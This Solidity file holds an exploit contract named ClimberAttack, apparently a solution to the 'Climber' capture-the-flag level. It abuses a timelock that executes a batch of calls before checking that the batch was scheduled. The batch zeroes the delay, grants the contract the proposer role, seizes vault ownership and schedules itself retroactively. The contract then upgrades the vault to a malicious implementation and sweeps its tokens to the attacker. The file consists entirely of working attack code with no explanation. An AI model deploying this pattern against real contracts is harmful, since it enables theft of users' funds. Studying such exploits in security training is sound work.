// SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

pragma solidity ^0.8.0;

interface ITimelock {
    function schedule(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt) external;
    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt) external payable;
}

interface IVault {
    function sweepFunds(address tokenAddress) external;
    function upgradeTo(address newImplementation) external;
}

contract ClimberAttack {

    ITimelock timelock;
    address vaultAddress;
    address maliciousVaultAddress;
    address tokenAddress;

    address owner;

    address[] addresses;
    uint256[] values;
    bytes[] dataElements;

    constructor(
        address _timelockAddress,
        address _vaultAddress,
        address _maliciousVaultAddress,
        address _tokenAddress
    ) {
        owner = msg.sender;
        timelock = ITimelock(_timelockAddress);
        vaultAddress = _vaultAddress;
        maliciousVaultAddress = _maliciousVaultAddress;
        tokenAddress = _tokenAddress;
    }

    function schedule() public{
        timelock.schedule(addresses, values, dataElements, bytes32(bytes("salty")));
    } 

    function triggerAttack() external {
        require(msg.sender == owner, "Only owner allowed");

        addresses.push(address(timelock));
        addresses.push(address(timelock));
        addresses.push(vaultAddress);
        addresses.push(address(this));

        values.push(0);
        values.push(0);
        values.push(0);
        values.push(0);

        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));
        dataElements.push(abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this)));
        dataElements.push(abi.encodeWithSignature("transferOwnership(address)", address(this)));
        dataElements.push(abi.encodeWithSignature("schedule()"));

        timelock.execute(
            addresses, // address[] calldata targets 
            values, // uint256[] calldata values
            dataElements, // bytes[] calldata dataElements
            bytes32(bytes("salty")) //bytes32 salt
        );

        IVault(vaultAddress).upgradeTo(maliciousVaultAddress);
        IVault(vaultAddress).sweepFunds(tokenAddress);

        IERC20 _token = IERC20(tokenAddress);
        require(_token.transfer(owner, _token.balanceOf(address(this))), "Transfer failed");

    }

}